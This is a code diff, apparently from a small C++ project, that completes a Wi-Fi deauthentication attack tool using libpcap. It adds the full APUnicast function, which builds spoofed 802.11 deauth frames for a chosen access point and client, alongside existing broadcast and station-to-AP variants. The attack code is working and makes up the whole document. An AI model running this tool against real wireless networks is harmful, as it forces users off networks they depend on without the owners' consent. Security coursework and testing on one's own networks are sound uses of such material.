@@ -21,15 +21,8 @@ void ApBroadcast(pcap_t* handle, char* apMac){
 
     struct last packet;
 
-    //header
-    packet.rheader.it_version = 0;
-    packet.rheader.it_pad = 0;
-    packet.rheader.it_len = 0x08;
-    packet.rheader.it_present = 0;
-
     //deauth
     packet.deauth.frame_control = 0x00c0;
-    packet.deauth.duration_id = 0;
     
     for(int i = 0;i<6;i++){
         packet.deauth.readdr1[i] = 0xff;
@@ -40,7 +33,6 @@ void ApBroadcast(pcap_t* handle, char* apMac){
         packet.deauth.bssid[i] = send[i];
     }
 
-    packet.deauth.sequence_control = 0;
     packet.fixed.ReasonCode = 0x0007;
 
     if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
@@ -50,11 +42,56 @@ void ApBroadcast(pcap_t* handle, char* apMac){
 
 void APUnicast(pcap_t* handle, char* apMac, char* stationMac){
     //Ap -> Station
+    //Station MAC ADDR
+    uint8_t send[6];
+
+    //AP MAC ADDR
+    uint8_t des[6];
+    std::istringstream apMacStream(apMac);
+    std::istringstream stationMacStream(stationMac);
+    int value;
+    char colon;
+
+    for (int i = 0; i < 6; ++i) {
+        apMacStream >> std::hex >> value >> colon;
+        send[i] = static_cast<uint8_t>(value);
+    }
+
+    value = 0;
+    colon = 0;
+
+    for (int i = 0; i < 6; ++i) {
+        stationMacStream >> std::hex >> value >> colon;
+        des[i] = static_cast<uint8_t>(value);
+    }
+
+    struct last packet;
+
+    //deauth
+    packet.deauth.frame_control = 0x00c0;
+    
+    for(int i = 0;i<6;i++){
+        packet.deauth.readdr1[i] = des[i];
+    }
+
+    for(int i = 0;i<6;i++){
+        packet.deauth.sourceaddr4[i] = send[i]; 
+    }
+
+    for(int i = 0;i<6;i++){
+        packet.deauth.bssid[i] = send[i];
+    }
+
+    packet.fixed.ReasonCode = 0x0007;
+
+    if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
+        fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
+    }
 }
 
 void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
     //Station -> AP
-    
+
     //Station MAC ADDR
     uint8_t send[6];
 
@@ -80,15 +117,8 @@ void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
 
     struct last packet;
 
-    //header
-    packet.rheader.it_version = 0;
-    packet.rheader.it_pad = 0;
-    packet.rheader.it_len = 0x08;
-    packet.rheader.it_present = 0;
-
     //deauth
     packet.deauth.frame_control = 0x10c0;
-    packet.deauth.duration_id = 0;
     
     for(int i = 0;i<6;i++){
         packet.deauth.readdr1[i] = des[i];
@@ -102,7 +132,6 @@ void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
         packet.deauth.bssid[i] = des[i];
     }
 
-    packet.deauth.sequence_control = 0;
     packet.fixed.ReasonCode = 0x0003;
 
     if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
